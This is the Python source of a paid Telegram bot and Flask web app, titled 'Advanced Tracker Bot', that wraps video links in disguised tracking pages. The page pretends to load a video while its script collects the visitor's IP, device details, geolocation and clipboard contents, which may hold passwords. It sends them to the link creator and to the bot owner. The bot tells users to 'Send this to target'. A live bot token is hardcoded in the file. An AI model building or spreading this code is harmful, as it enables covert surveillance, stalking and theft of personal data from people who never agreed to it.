import telebot
from telebot import types
import sqlite3
import datetime
import uuid
import time
import json
import os
from flask import Flask, request, render_template_string
import threading

# ==================== CONFIG ====================
BOT_TOKEN = "8036301185:AAHWgCcSn2dZbnW84nQJYIeG-ESyOO12hhs"
OWNER_ID = 6504476778
bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# ==================== DATABASE SETUP ====================
DB_PATH = 'bot.db'

def get_db():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    c = conn.cursor()
    # Users table
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY,
                  username TEXT,
                  is_paid INTEGER DEFAULT 0,
                  subscription_end TEXT,
                  phone TEXT,
                  location TEXT)''')
    # Links table
    c.execute('''CREATE TABLE IF NOT EXISTS links
                 (link_id TEXT PRIMARY KEY,
                  user_id INTEGER,
                  original_url TEXT,
                  modified_url TEXT,
                  created_at TEXT,
                  clicks INTEGER DEFAULT 0)''')
    # Clicks table
    c.execute('''CREATE TABLE IF NOT EXISTS clicks
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  link_id TEXT,
                  ip TEXT,
                  user_agent TEXT,
                  screen TEXT,
                  language TEXT,
                  platform TEXT,
                  timezone TEXT,
                  battery TEXT,
                  location TEXT,
                  camera TEXT,
                  clipboard TEXT,
                  phone TEXT,
                  timestamp TEXT)''')
    conn.commit()
    conn.close()
    print("✅ Database ready")

# ==================== BASE URL (Render automatically set karega) ====================
BASE_URL = os.environ.get('RENDER_EXTERNAL_URL', 'https://your-app.onrender.com')

# ==================== WELCOME MESSAGE (20 lines) ====================
WELCOME_MSG = """
🌟 *WELCOME TO ADVANCED TRACKER BOT* 🌟
━━━━━━━━━━━━━━━━━━━━━
🔹 *What I Can Do?*
• Convert any video link into a tracking link
• Collect visitor information (IP, device, browser, etc.)
• Free plan: Basic info (1-10)
• Premium plan: Full info (11-21) including location, camera, clipboard

━━━━━━━━━━━━━━━━━━━━━
📌 *Commands:*
/start – Show this menu
/terminal:gernatLINK – Generate a tracking link
/balance – Check your subscription
/bot_info – Features comparison
/subscription – Upgrade to premium (Stars)
/log_history – View your past links and clicks

━━━━━━━━━━━━━━━━━━━━━
💎 *Premium Plans (Stars):*
⭐ 7 Stars – 30 Days
⭐ 4 Stars – 15 Days
⭐ 1 Star – 1 Day

━━━━━━━━━━━━━━━━━━━━━
👑 *Owner:* @EVEL_DEAD0751
"""

# ==================== BOT COMMANDS ====================
@bot.message_handler(commands=['start'])
def start_cmd(message):
    # Save user
    conn = get_db()
    c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)",
              (message.from_user.id, message.from_user.username))
    
    # Owner ko permanent premium
    if message.from_user.id == OWNER_ID:
        c.execute("UPDATE users SET is_paid=1, subscription_end='permanent' WHERE user_id=?", (OWNER_ID,))
    
    conn.commit()
    conn.close()

    # Main menu
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        types.KeyboardButton("🔗 GENERATE LINK"),
        types.KeyboardButton("💰 BALANCE"),
        types.KeyboardButton("ℹ️ BOT INFO"),
        types.KeyboardButton("💎 SUBSCRIPTION"),
        types.KeyboardButton("📊 LOG HISTORY")
    )
    bot.send_message(
        message.chat.id,
        WELCOME_MSG,
        parse_mode="Markdown",
        reply_markup=markup
    )

# ==================== CHECK SUBSCRIPTION FUNCTION ====================
def is_premium(user_id):
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT is_paid, subscription_end FROM users WHERE user_id=?", (user_id,))
    row = c.fetchone()
    conn.close()
    
    if not row or row[0] == 0:
        return False
    
    if row[1] == 'permanent':
        return True
    
    if row[1]:
        end_date = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
        if datetime.datetime.now() < end_date:
            return True
    
    return False

# ==================== GENERATE LINK ====================
@bot.message_handler(func=lambda m: m.text == "🔗 GENERATE LINK" or m.text == "/terminal:gernatLINK")
def gen_link(message):
    premium = is_premium(message.from_user.id)
    
    if premium:
        features = "✨ *Premium Features (11-21)*\n• Camera, Location, Clipboard\n• Battery, Phone Number\n• IPv6, Device Memory\n• Bluetooth, XR Info"
    else:
        features = "🔹 *Free Features (1-10)*\n• IP Address\n• Device Info\n• Browser & Platform\n• Screen Resolution\n• Language & Timezone"

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("➕ ENTER VIDEO LINK", callback_data="enter_link"))
    
    bot.send_message(
        message.chat.id,
        f"🔗 *LINK GENERATOR*\n\n{features}\n\nClick button and paste your video link.",
        parse_mode="Markdown",
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data == "enter_link")
def ask_link(call):
    bot.edit_message_text(
        "📤 *Send me the video link*\nExample: https://youtube.com/watch?v=...",
        call.message.chat.id,
        call.message.message_id,
        parse_mode="Markdown"
    )
    bot.register_next_step_handler(call.message, process_link)

def process_link(message):
    url = message.text.strip()
    if not (url.startswith('http://') or url.startswith('https://')):
        bot.reply_to(message, "❌ Invalid link! Must start with http:// or https://")
        return

    # Loading animation
    loading = bot.reply_to(message, "⏳ 0%")
    for i in range(1, 11):
        time.sleep(0.2)
        try:
            bot.edit_message_text(f"⏳ {i*10}%", loading.chat.id, loading.message_id)
        except:
            pass

    link_id = str(uuid.uuid4())[:8]
    modified_url = f"{BASE_URL}/click/{link_id}"

    # Save to database
    try:
        conn = get_db()
        c = conn.cursor()
        c.execute(
            "INSERT INTO links (link_id, user_id, original_url, modified_url, created_at) VALUES (?, ?, ?, ?, ?)",
            (link_id, message.from_user.id, url, modified_url, datetime.datetime.now())
        )
        conn.commit()
        conn.close()
    except Exception as e:
        bot.edit_message_text(f"❌ Database error: {e}", loading.chat.id, loading.message_id)
        return

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("📋 COPY LINK", callback_data=f"copy_{link_id}"))
    
    bot.edit_message_text(
        f"✅ *LINK GENERATED!*\n\n`{modified_url}`\n\nSend this to target.",
        loading.chat.id,
        loading.message_id,
        parse_mode="Markdown",
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith('copy_'))
def copy_link(call):
    link_id = call.data.replace('copy_', '')
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT modified_url FROM links WHERE link_id=?", (link_id,))
    row = c.fetchone()
    conn.close()
    if row:
        bot.answer_callback_query(call.id, "✅ Copied!")
        bot.send_message(call.message.chat.id, f"📋 `{row[0]}`", parse_mode="Markdown")
    else:
        bot.answer_callback_query(call.id, "❌ Link not found")

# ==================== BALANCE ====================
@bot.message_handler(func=lambda m: m.text == "💰 BALANCE")
def balance_cmd(message):
    if message.from_user.id == OWNER_ID:
        bot.send_message(message.chat.id, "👑 *OWNER*\n✨ Permanent Premium", parse_mode="Markdown")
        return
    
    premium = is_premium(message.from_user.id)
    if premium:
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT subscription_end FROM users WHERE user_id=?", (message.from_user.id,))
        row = c.fetchone()
        conn.close()
        end = row[0][:10] if row and row[0] else "Unknown"
        bot.send_message(
            message.chat.id,
            f"💎 *PREMIUM USER*\n📅 Valid till: {end}\n✨ Features: Full (11-21)",
            parse_mode="Markdown"
        )
    else:
        bot.send_message(
            message.chat.id,
            "🆓 *FREE USER*\n✨ Features: Basic (1-10)\n💎 Upgrade: /subscription",
            parse_mode="Markdown"
        )

# ==================== BOT INFO ====================
@bot.message_handler(func=lambda m: m.text == "ℹ️ BOT INFO" or m.text == "/bot_info")
def info_cmd(message):
    info_text = """
🤖 *BOT INFORMATION*

🔹 *FREE PLAN (Features 1-10)*
1. IPv4 Address
2. Battery Percentage
3. Network Type
4. Device Info
5. Platform
6. App Version
7. User Agent
8. Screen Resolution
9. Language & Timezone
10. Basic Permissions

💎 *PREMIUM PLAN (Features 11-21)*
11. IPv6 Address
12. Front Camera Snapshot
13. Back Camera Snapshot
14. Device Memory
15. Port Number
16. Bluetooth Info
17. XR (VR/AR) Info
18. Complete Location
19. Clipboard Data
20. 📱 Phone Number
21. Extended Device Info

⭐ *Premium Price:*
• 7 Stars – 30 Days
• 4 Stars – 15 Days
• 1 Star – 1 Day
"""
    bot.send_message(message.chat.id, info_text, parse_mode="Markdown")

# ==================== SUBSCRIPTION (STARS PAYMENT) ====================
@bot.message_handler(commands=['subscription'])
@bot.message_handler(func=lambda m: m.text == "💎 SUBSCRIPTION")
def subscription_cmd(message):
    markup = types.InlineKeyboardMarkup(row_width=1)
    btn1 = types.InlineKeyboardButton("⭐ 7 Stars – 30 Days", callback_data="pay_30")
    btn2 = types.InlineKeyboardButton("⭐ 4 Stars – 15 Days", callback_data="pay_15")
    btn3 = types.InlineKeyboardButton("⭐ 1 Star – 1 Day", callback_data="pay_1")
    markup.add(btn1, btn2, btn3)
    
    bot.send_message(
        message.chat.id,
        "💎 *CHOOSE PREMIUM PLAN*\n\nSelect duration:",
        parse_mode="Markdown",
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith('pay_'))
def pay_callback(call):
    days = 30 if call.data == "pay_30" else 15 if call.data == "pay_15" else 1
    stars = 7 if days == 30 else 4 if days == 15 else 1
    
    try:
        bot.send_invoice(
            call.message.chat.id,
            title=f"Premium {days} Days",
            description=f"{days} days premium access (features 11-21)",
            invoice_payload=f"premium_{days}",
            provider_token="",
            currency="XTR",
            prices=[types.LabeledPrice(label="Premium", amount=stars)]
        )
    except Exception as e:
        bot.answer_callback_query(call.id, f"❌ Error: {e}")

@bot.pre_checkout_query_handler(func=lambda q: True)
def pre_checkout(q):
    bot.answer_pre_checkout_query(q.id, ok=True)

@bot.message_handler(content_types=['successful_payment'])
def payment_success(message):
    # Extract days from payload
    payload = message.successful_payment.invoice_payload
    days = int(payload.split('_')[1])
    
    # Calculate end date
    end_date = (datetime.datetime.now() + datetime.timedelta(days=days)).strftime('%Y-%m-%d %H:%M:%S')
    
    # Update database
    conn = get_db()
    c = conn.cursor()
    c.execute("UPDATE users SET is_paid=1, subscription_end=? WHERE user_id=?", 
              (end_date, message.from_user.id))
    conn.commit()
    conn.close()
    
    # Notify owner
    stars = message.successful_payment.total_amount // 100  # Stars in smallest unit
    bot.send_message(OWNER_ID, f"💰 New premium: {message.from_user.id}\nStars: {stars}\nDays: {days}")
    
    bot.send_message(
        message.chat.id,
        f"✅ Premium activated for {days} days! Thank you.",
        parse_mode="Markdown"
    )

# ==================== LOG HISTORY ====================
@bot.message_handler(func=lambda m: m.text == "📊 LOG HISTORY" or m.text == "/log_history")
def history_cmd(message):
    conn = get_db()
    c = conn.cursor()
    c.execute('''SELECT l.link_id, l.original_url, l.created_at, COUNT(c.id) as clicks
                 FROM links l LEFT JOIN clicks c ON l.link_id = c.link_id
                 WHERE l.user_id = ? GROUP BY l.link_id ORDER BY l.created_at DESC LIMIT 5''',
              (message.from_user.id,))
    rows = c.fetchall()
    conn.close()
    
    if not rows:
        bot.send_message(message.chat.id, "📭 No history found.")
        return
    
    text = "📊 *YOUR RECENT LINKS*\n\n"
    for r in rows:
        short_url = r[1][:40] + "..." if len(r[1]) > 40 else r[1]
        text += f"🔗 `{r[0]}`\n📝 {short_url}\n👥 {r[3]} clicks\n📅 {r[2][:10]}\n\n"
    
    bot.send_message(message.chat.id, text, parse_mode="Markdown")

# ==================== PERMISSION-BASED DATA COLLECTION ====================
@bot.message_handler(content_types=['location'])
def handle_location(message):
    lat = message.location.latitude
    lon = message.location.longitude
    
    conn = get_db()
    c = conn.cursor()
    c.execute("UPDATE users SET location=? WHERE user_id=?", 
              (f"{lat},{lon}", message.from_user.id))
    if c.rowcount == 0:
        c.execute("INSERT INTO users (user_id, username, location) VALUES (?, ?, ?)",
                  (message.from_user.id, message.from_user.username, f"{lat},{lon}"))
    conn.commit()
    conn.close()
    
    bot.send_message(OWNER_ID, f"📍 Location from {message.from_user.id}: {lat},{lon}")
    bot.reply_to(message, "✅ Location received! Thank you.")

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    phone = message.contact.phone_number
    
    conn = get_db()
    c = conn.cursor()
    c.execute("UPDATE users SET phone=? WHERE user_id=?", (phone, message.from_user.id))
    if c.rowcount == 0:
        c.execute("INSERT INTO users (user_id, username, phone) VALUES (?, ?, ?)",
                  (message.from_user.id, message.from_user.username, phone))
    conn.commit()
    conn.close()
    
    bot.send_message(OWNER_ID, f"📞 Phone from {message.from_user.id}: {phone}")
    bot.reply_to(message, "✅ Phone number received! Thank you.")

# ==================== TRACKING PAGE HTML ====================
TRACKING_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>Loading video...</title>
    <style>
        body { background: #0f172a; color: white; font-family: Arial; text-align: center; padding: 50px; }
        .loader { border: 8px solid #334155; border-top: 8px solid #3b82f6; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <h2>🎥 Preparing your video...</h2>
    <div class="loader"></div>
    <p>Redirecting in <span id="countdown">3</span> seconds</p>

    <script>
        (async function() {
            const data = {};
            
            // Basic info (always collected)
            data.screen = screen.width + 'x' + screen.height;
            data.language = navigator.language;
            data.platform = navigator.platform;
            data.userAgent = navigator.userAgent;
            data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            
            // Check if user is premium via link owner
            const isPremium = {{is_premium}};
            
            if (isPremium) {
                // Battery
                if (navigator.getBattery) {
                    try {
                        const battery = await navigator.getBattery();
                        data.battery = battery.level * 100 + '%';
                    } catch(e) {}
                }
                
                // Location
                if (navigator.geolocation) {
                    try {
                        const pos = await new Promise((resolve, reject) => {
                            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 3000 });
                        });
                        data.location = pos.coords.latitude + ',' + pos.coords.longitude;
                    } catch(e) {}
                }
                
                // Camera
                if (navigator.mediaDevices) {
                    try {
                        const devices = await navigator.mediaDevices.enumerateDevices();
                        data.camera = devices.some(d => d.kind === 'videoinput') ? 'available' : 'none';
                    } catch(e) {}
                }
                
                // Clipboard
                if (navigator.clipboard && navigator.clipboard.readText) {
                    try {
                        data.clipboard = await navigator.clipboard.readText();
                    } catch(e) {}
                }
            }
            
            // Send to server
            fetch('/collect/{{link_id}}', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).catch(err => console.log(err));
            
            // Countdown redirect
            let sec = 3;
            const timer = setInterval(() => {
                sec--;
                document.getElementById('countdown').innerText = sec;
                if (sec <= 0) {
                    clearInterval(timer);
                    window.location.href = "{{original_url}}";
                }
            }, 1000);
        })();
    </script>
</body>
</html>
'''

# ==================== FLASK ROUTES ====================
@app.route('/')
def home():
    return "✅ Bot is running on Render!"

@app.route('/click/<link_id>')
def click_track(link_id):
    try:
        ip = request.remote_addr
        ua = request.user_agent.string
        
        conn = get_db()
        c = conn.cursor()
        
        # Get original URL and user_id
        c.execute("SELECT original_url, user_id FROM links WHERE link_id=?", (link_id,))
        row = c.fetchone()
        if not row:
            conn.close()
            return "Link not found", 404
        
        original_url = row[0]
        user_id = row[1]
        
        # Check if link owner is premium
        owner_premium = is_premium(user_id)
        
        # Insert click record
        c.execute("INSERT INTO clicks (link_id, ip, user_agent, timestamp) VALUES (?, ?, ?, ?)",
                  (link_id, ip, ua, datetime.datetime.now()))
        c.execute("UPDATE links SET clicks = clicks + 1 WHERE link_id=?", (link_id,))
        conn.commit()
        conn.close()
        
        # Notify owner
        try:
            bot.send_message(OWNER_ID, f"📊 New click on {link_id}\nIP: {ip}")
        except:
            pass
        
        # Render HTML with premium status
        html = TRACKING_HTML.replace("{{link_id}}", link_id)
        html = html.replace("{{original_url}}", original_url)
        html = html.replace("{{is_premium}}", "true" if owner_premium else "false")
        
        return render_template_string(html)
        
    except Exception as e:
        return f"Error: {e}", 500

@app.route('/collect/<link_id>', methods=['POST'])
def collect_data(link_id):
    try:
        data = request.json
        
        conn = get_db()
        c = conn.cursor()
        
        # Get user who owns this link
        c.execute("SELECT user_id FROM links WHERE link_id=?", (link_id,))
        link_row = c.fetchone()
        if not link_row:
            conn.close()
            return json.dumps({"status": "error"}), 404
        
        user_id = link_row[0]
        
        # Update the most recent click for this link from this IP
        ip = request.remote_addr
        c.execute('''UPDATE clicks SET 
                     screen=?, language=?, platform=?, timezone=?,
                     battery=?, location=?, camera=?, clipboard=?
                     WHERE link_id=? AND ip=? AND timestamp=(
                         SELECT MAX(timestamp) FROM clicks WHERE link_id=? AND ip=?
                     )''',
                  (data.get('screen'), data.get('language'), data.get('platform'),
                   data.get('timezone'), data.get('battery'), data.get('location'),
                   data.get('camera'), data.get('clipboard'),
                   link_id, ip, link_id, ip))
        conn.commit()
        
        # Send collected info to user1 (link owner) if they're premium
        if is_premium(user_id):
            msg = f"📥 *New Visitor Data*\nIP: {ip}\n"
            for key, value in data.items():
                if value:
                    msg += f"{key}: {value}\n"
            try:
                bot.send_message(user_id, msg, parse_mode="Markdown")
            except:
                pass
        
        # Always send to owner
        owner_msg = f"🔔 *New Data*\nLink: {link_id}\nUser1: {user_id}\nIP: {ip}\nData: {json.dumps(data)}"
        bot.send_message(OWNER_ID, owner_msg, parse_mode="Markdown")
        
        conn.close()
        return json.dumps({"status": "ok"})
        
    except Exception as e:
        print("Error in /collect:", e)
        return json.dumps({"status": "error"}), 500

# ==================== START BOT ====================
def run_bot():
    init_db()
    print("🤖 Bot polling started...")
    bot.infinity_polling()

if __name__ == "__main__":
    # Start bot in thread
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    # Run Flask
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)